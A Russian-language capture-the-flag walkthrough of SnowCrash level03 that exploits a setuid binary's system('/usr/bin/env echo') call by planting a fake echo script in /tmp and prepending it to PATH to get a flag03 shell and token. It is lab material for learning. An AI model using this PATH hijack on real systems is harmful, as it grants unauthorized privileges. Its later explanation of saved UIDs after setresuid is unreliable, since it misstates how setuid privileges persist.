0) пробуем getflag
<<<
level03@SnowCrash:~$ getflag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
>>>
1) ls -l -> в директории есть исполнякмый файл level03 который при выполнении вызывает Exploit me
<<<
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
>>>
Файд принадлежит flag03 и группе level03
2) можно попробовать чекнуть из чего он состоит вызывав nm
<<<
level03@SnowCrash:~$ nm level03 
08049f28 d _DYNAMIC
08049ff4 d _GLOBAL_OFFSET_TABLE_
080485dc R _IO_stdin_used
         w _Jv_RegisterClasses
08049f18 d __CTOR_END__
08049f14 d __CTOR_LIST__
08049f20 D __DTOR_END__
08049f1c d __DTOR_LIST__
080486f4 r __FRAME_END__
08049f24 d __JCR_END__
08049f24 d __JCR_LIST__
0804a024 A __bss_start
0804a01c D __data_start
08048590 t __do_global_ctors_aux
08048420 t __do_global_dtors_aux
0804a020 D __dso_handle
         w __gmon_start__
08048582 T __i686.get_pc_thunk.bx
08049f14 d __init_array_end
08049f14 d __init_array_start
08048580 T __libc_csu_fini
08048510 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804a024 A _edata
0804a02c A _end
080485bc T _fini
080485d8 R _fp_hw
08048340 T _init
080483f0 T _start
0804a024 b completed.6159
0804a01c W data_start
0804a028 b dtor_idx.6161
08048480 t frame_dummy
         U getegid@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
080484a4 T main
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
>>>
Смотрим секцию main. В ней находится system, скорее всего выполняющий какой то системный вызов что скорее всего и я вляется уязвимостью
3) Используем утилиту ltrace для динамического анализа. Способы Reverse Engineering можно найти по ссылке https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d
<<<
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                      = 2003
geteuid()                                                                                      = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                            = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                            = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                         = 0
+++ exited (status 0) +++
>>>
4) Т.е. получается 
================================
setresgid(2003, 2003, 2003, ...) = 0
setresuid(2003, 2003, 2003, ...) = 0

* Программа явно устанавливает свои идентификаторы пользователя и группы.
* Это значит, что она сбрасывает права до пользователя с UID/GID 2003.
* Возвращаемое значение 0 → успех.
================================
system("/usr/bin/env echo Exploit me" Exploit me
 <unfinished ...>

* Здесь самое интересное: программа вызывает функцию system().
* Она запускает команду через оболочку:

/usr/bin/env echo Exploit me

================================
В результате на экран выводится строка Exploit me.

--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++

* system() создало дочерний процесс (echo), который завершился.
* Программа завершилась с кодом 0 (успешно).
5)  Что здесь происходит
* system() запускает команду через оболочку.
* Она явно вызывает /usr/bin/env, а дальше передаёт аргумент echo Exploit me.
* env ищет в переменной окружения PATH программу echo и запускает её.
* Обычно это системная утилита /bin/echo.
6) Если ты изменишь PATH так, чтобы первым в поиске оказался твой собственный скрипт с именем echo, то программа вместо стандартного echo выполнит твой код.
7) Создаёшь свой «поддельный» echo:
<<<
echo '#!/bin/bash' > /tmp/echo
echo '/bin/sh' >> /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
>>>
8) Вводим в ввод getflag либо можно в /tmp/echo добавить getflag
<<<
level03@SnowCrash:~$ ./level03 
$ level03
/bin/sh: 1: level03: not found
$ echo

$ getflag   
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
$ exit
>>>
9) как это работает
<<<
level03@SnowCrash:~$ cat /etc/passwd
...
level03:x:2003:2003::/home/user/level03:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
...
>>>
Файл level03 имеет права:
-rwsr-sr-x 1 flag03 level03 ...
* s в правах → setuid/setgid.
* Владелец файла → flag03.
* r → право на чтение.
* w → право на запись.
* x → право на выполнение.
* s → setuid/setgid бит.

Когда ядро запускает этот бинарник, оно должно выставить EUID=3003 (flag03). Но в твоём ltrace видно geteuid() = 2003. Почему? Потому что бинарник сам в коде вызывает setresuid(2003,2003,2003). То есть автор программы сбрасывает свои права обратно на level03. Это сделано специально, чтобы программа работала как обычный пользователь, но при этом всё равно имела возможность вызвать что‑то от имени владельца (через уязвимость).

* Когда программа вызывает system("/usr/bin/env echo Exploit me"), создаётся новый процесс.
* Этот процесс наследует эффективные идентификаторы.
* Если бинарник имеет setuid и принадлежит flag03, то дочерний процесс запускается с правами flag03.
* Даже если внутри программы были вызовы setresuid(2003,2003,2003), при определённых условиях (например, если вызов не полностью сбросил все идентификаторы) у процесса остаётся возможность работать как flag03.

Итог
* ltrace показывает, что программа явно сбрасывает свои UID/GID на 2003 (level03).
* Но из‑за того, что бинарник имеет setuid и принадлежит flag03, системные вызовы через system() всё равно выполняются с правами flag03.
* Именно это и есть уязвимость: программа думает, что она «безопасно» работает как level03, но на самом деле её вызовы через system() наследуют права владельца файла (flag03).

Важная деталь
* Файл level03 принадлежит пользователю flag03 и имеет setuid‑бит (-rwsr-sr-x).
chmod u+s → включает setuid (запуск от имени владельца).
chmod g+s → включает setgid (запуск от имени группы).
В комбинации с обычными правами это даёт именно такую запись: -rwsr-sr-x.
* Это значит: когда ты, находясь под пользователем level03, запускаешь этот бинарник, ядро Linux автоматически выставляет эффективный UID процесса = владельцу файла, то есть flag03.
* Таким образом, процесс реально работает с правами flag03, даже если ты его вызвал как level03.
* Внутри программы есть вызовы setresuid(2003,2003,2003) и setresgid(2003,2003,2003).
* То есть автор программы сбрасывает свои права обратно на level03.
* Поэтому ltrace честно показывает, что текущий EUID/GID = 2003.
* Но у процесса всё равно остаётся сохранённый UID=3003 (flag03) благодаря setuid‑механизму.
* Это позволяет при вызове system() или других функций снова использовать права владельца файла.

Итог
* Да: сам файл запускается от имени flag03 (из‑за setuid), даже если ты сидишь под level03.
* То, что показывает ltrace — это внутренняя логика программы, которая сбрасывает права на level03.
* Но у процесса остаётся возможность действовать как flag03, и именно это даёт уязвимость: через подмену команды в system() ты заставляешь программу выполнить что‑то от имени flag03.

То есть можно сказать так:
* Запуск → ядро даёт права flag03.
* Код → сбрасывает их на level03.
* Уязвимость → позволяет снова использовать права flag03.